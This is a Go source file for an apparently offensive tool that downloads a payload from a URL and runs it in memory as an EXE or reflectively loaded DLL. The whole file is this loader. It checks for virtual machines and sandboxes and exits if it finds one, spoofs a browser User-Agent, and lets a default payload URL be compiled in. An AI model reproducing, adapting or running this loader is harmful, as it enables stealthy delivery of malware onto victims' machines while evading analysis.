package main

import (
	"flag"
	"fmt"
	"gohttpmem/pkg/gorundll"
	"gohttpmem/pkg/gorunpe"
	"gohttpmem/pkg/vm"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
	defaultDownloadURL = ""
)

func main() {
	// check if inside vm

	var suspicion int = 0
	vm.CheckSleepDrift()
	vm.CheckUptime()
	vm.CheckCoreCount()
	vm.CheckGPU()
	if suspicion > 2 {
		runtime.GC()
		os.Exit(0)
	}
	// Parse command line flags
	isDllPtr := flag.Bool("dll", false, "Specifies whether the payload is a DLL (default: false, treats payload as EXE)")
	procNamePtr := flag.String("proc", "", "For DLLs: Name of the exported procedure to call (optional)")
	ordinalPtr := flag.Int("ordinal", -1, "For DLLs: Ordinal of the exported procedure to call (optional, takes precedence over -proc)")
	flag.Parse()

	// Get URL from remaining args
	args := flag.Args()

	// Determine downloadURL based on command-line arguments
	var downloadURL string
	if len(args) < 1 {
		downloadURL = defaultDownloadURL
	} else {
		downloadURL = args[0]
		// Basic URL validation
		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
			fmt.Println("URL must start with http:// or https://")
			return
		}
	}

	if downloadURL == "" {
		fmt.Println("Error: No download URL provided and no default URL configured")
		flag.Usage()
		return
	}

	// http client to download the payload
	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	// create the HTTP request with a standard user agent
	req, err := http.NewRequest("GET", downloadURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error downloading payload:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Error: HTTP status %d\n", resp.StatusCode)
		return
	}

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading payload:", err)
		return
	}

	if len(payload) < 512 {
		fmt.Println("Error: Payload too small to be a valid PE file")
		return
	}

	// Check if the payload is a DLL or EXE based on flags
	if *isDllPtr {
		// Load the DLL into memory
		fmt.Println("Loading DLL into memory...")
		dllHandle, err := gorundll.LoadDLLInMemory(payload)
		if err != nil {
			fmt.Println("Error loading DLL:", err)
			return
		}
		fmt.Printf("DLL loaded successfully at address: 0x%X\n", dllHandle)

		// Store the entry point for later DLL_PROCESS_DETACH

		// Try to call an exported procedure if requested by ordinal or name
		if *ordinalPtr >= 0 {
			fmt.Printf("Attempting to call exported procedure by ordinal: %d\n", *ordinalPtr)
			procAddr, err := gorundll.GetProcAddressByOrdinalFromMemoryDLL(dllHandle, uint16(*ordinalPtr))
			if err != nil {
				fmt.Printf("Error getting procedure address: %s\n", err)
			} else {
				fmt.Printf("Procedure address: 0x%X\n", procAddr)
				fmt.Println("Calling procedure...")

				// Call the procedure with no arguments
				_, _, _ = syscall.Syscall(procAddr, 0, 0, 0, 0)

				fmt.Println("Procedure call completed")
			}
		} else if *procNamePtr != "" {
			fmt.Printf("Attempting to call exported procedure by name: %s\n", *procNamePtr)
			procAddr, err := gorundll.GetProcAddressFromMemoryDLL(dllHandle, *procNamePtr)
			if err != nil {
				fmt.Printf("Error getting procedure address: %s\n", err)
			} else {
				fmt.Printf("Procedure address: 0x%X\n", procAddr)
				fmt.Println("Calling procedure...")

				// Call the procedure with no arguments
				_, _, _ = syscall.Syscall(procAddr, 0, 0, 0, 0)

				fmt.Println("Procedure call completed")
			}
		}

		// Clean up
		err = gorundll.FreeDLLFromMemory(dllHandle)
		if err != nil {
			fmt.Println("Error freeing DLL:", err)
		} else {
			fmt.Println("DLL memory freed successfully")
		}
	} else {
		// Execute the payload as an EXE
		fmt.Println("Executing payload as EXE...")
		err = gorunpe.ExecuteInMemory(payload)
		if err != nil {
			fmt.Println("Error executing payload:", err)
			return
		}
	}
}
